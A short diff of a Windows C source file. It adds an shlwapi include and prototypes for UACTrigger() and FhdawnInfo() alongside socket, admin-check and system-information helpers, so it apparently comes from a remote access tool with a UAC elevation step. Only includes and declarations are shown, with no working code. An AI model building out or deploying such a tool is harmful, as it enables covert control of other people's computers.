@@ -16,11 +16,12 @@ Modified: -
 #include <iphlpapi.h>
 #include <psapi.h>
 #include <wininet.h>
-
+#include <shlwapi.h>
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 #define BUFFER 1024
 static BOOL connected = FALSE;
@@ -37,6 +38,8 @@ void TimeStamp(char buffer[100]);
 BOOL IsAdmin();
 //=====================
 void sockprintf(SOCKET sock, const char* words, ...);
+void UACTrigger();
+char* FhdawnInfo();
 BOOL isFile(const char* file);
 void UserPC();
 char* cDir();
